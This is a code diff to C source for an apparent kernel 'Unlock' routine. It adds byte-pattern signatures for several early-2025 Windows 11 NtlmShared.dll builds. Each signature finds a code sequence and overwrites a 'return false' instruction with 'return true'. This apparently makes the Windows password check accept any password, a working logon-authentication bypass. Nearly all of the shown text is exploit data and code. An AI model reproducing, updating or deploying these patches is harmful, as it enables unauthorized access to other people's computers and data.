@@ -94,7 +94,7 @@ VOID InitializeKernelFunctions2(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS2 
 typedef struct tdSignatureChunk {
 	WORD cbOffset;
 	BYTE cb;
-	BYTE pb[13];
+	BYTE pb[20];
 } SIGNATURE_CHUNK, *PSIGNATURE_CHUNK;
 
 typedef struct tdSignature {
@@ -129,7 +129,7 @@ NTSTATUS Unlock_FindAndPatch(_In_ PKERNEL_FUNCTIONS2 fnk2, _Inout_ PBYTE pbPages
 	return E_FAIL;
 }
 
-#define NUMBER_OF_SIGNATURES 33
+#define NUMBER_OF_SIGNATURES 35
 NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 {
 	SIGNATURE oSigs[] = {
@@ -352,6 +352,20 @@ NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 			{.cbOffset = 0xB31,.cb = 13,.pb = { 0x4D, 0x2B, 0xF5, 0x75, 0xEF, 0x84, 0xD2, 0x74, 0x0A, 0x32, 0xC0, 0xEB, 0x09 } },
 			{.cbOffset = 0xB3A,.cb = 2,.pb = { 0x32, 0xC0 } },
 			{.cbOffset = 0xB3A,.cb = 2,.pb = { 0xB0, 0x01 } } }
+		},
+		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.26100.2894 / 2025-01-12]
+		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.26100.3037 / 2025-01-24]
+		{.chunk = {
+			{.cbOffset = 0x6A1,.cb = 20,.pb = { 0x4D, 0x2B, 0xFE, 0x75, 0xEF, 0x84, 0xD2, 0x0F, 0x84, 0x42, 0xF8, 0xFF, 0xFF, 0x32, 0xC0, 0xE9, 0x3E, 0xF8, 0xFF, 0xFF } },
+			{.cbOffset = 0x6AE,.cb = 2,.pb = { 0x32, 0xC0 } },
+			{.cbOffset = 0x6AE,.cb = 2,.pb = { 0xB0, 0x01 } } }
+		},
+		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.26100.3323 / 2025-02-21]
+		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.26100.3624 / 2025-03-22]
+		{.chunk = {
+			{.cbOffset = 0x6C1,.cb = 20,.pb = { 0x4D, 0x2B, 0xFE, 0x75, 0xEF, 0x84, 0xD2, 0x0F, 0x84, 0x42, 0xF8, 0xFF, 0xFF, 0x32, 0xC0, 0xE9, 0x3E, 0xF8, 0xFF, 0xFF } },
+			{.cbOffset = 0x6CE,.cb = 2,.pb = { 0x32, 0xC0 } },
+			{.cbOffset = 0x6CE,.cb = 2,.pb = { 0xB0, 0x01 } } }
 		},
 
 	};
